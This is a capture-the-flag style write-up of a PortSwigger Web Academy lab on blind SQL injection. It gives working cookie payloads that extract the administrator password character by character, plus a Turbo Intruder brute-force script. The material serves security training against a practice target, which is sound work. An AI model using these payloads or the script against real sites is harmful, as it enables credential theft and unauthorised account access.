Lab: Blind SQL injection with conditional responses
Category: SQL Injection (Blind)
Platform: PortSwigger Web Academy
URL: portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

Goal: Exploit blind SQLi via the TrackingId cookie to extract the administrator user's password (no direct data/error output — only a "Welcome back" message signals true/false), then log in as administrator.

Vulnerability: TrackingId cookie value gets inserted directly into a backend SQL query with no sanitization. The response never leaks data directly, but the app conditionally displays a "Welcome back" message when the injected query evaluates true — a classic boolean-based blind SQLi oracle.

Steps:

1. Captured request, sent to Repeater. Confirmed injection point by toggling:

TrackingId=<real_value>' AND '1'='1   → "Welcome back" appears
TrackingId=<real_value>' AND '1'='2   → "Welcome back" absent

2. Confirmed users table exists:

TrackingId=<real_value>' AND (SELECT 'a' FROM users LIMIT 1)='a

3. Confirmed administrator user exists:

TrackingId=<real_value>' AND (SELECT 'a' FROM users WHERE username='administrator')='a

4. Determined password length via incremental LENGTH(password)>N checks — confirmed length = 20.

5. Used Turbo Intruder (Community edition Intruder is throttled, so used this unthrottled extension instead) to brute-force each character:

TrackingId=<real_value>' AND (SELECT SUBSTRING(password,POS,1) FROM users WHERE username='administrator')='%s

Script used:

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False)

    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    for c in chars:
        engine.queue(target.req, c)

def handleResponse(req, interesting):
    table.add(req)

6. For each position (1 to 20), swapped POS in the payload, re-ran Turbo Intruder, sorted results by Length column — the row with a noticeably larger response length (extra "Welcome back!" text, ~60 bytes bigger) revealed the correct character at that position.
7. Repeated for all 20 positions, reconstructed the full password.
8. Logged in as administrator using the extracted password → lab Solved.

Payload pattern: TrackingId=<value>' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')='<char>
Injection point: TrackingId cookie

Takeaway: Blind SQLi requires inferring data through side-channel signals (a text difference, timing, response length) rather than reading it directly. Turbo Intruder was essential here since Community edition's Intruder throttles heavily — 20 positions × 36 characters would've been painfully slow otherwise. Sorting results by response length (not just status code) was the key technique to spot the true condition, since status codes stayed 200 regardless of true/false.
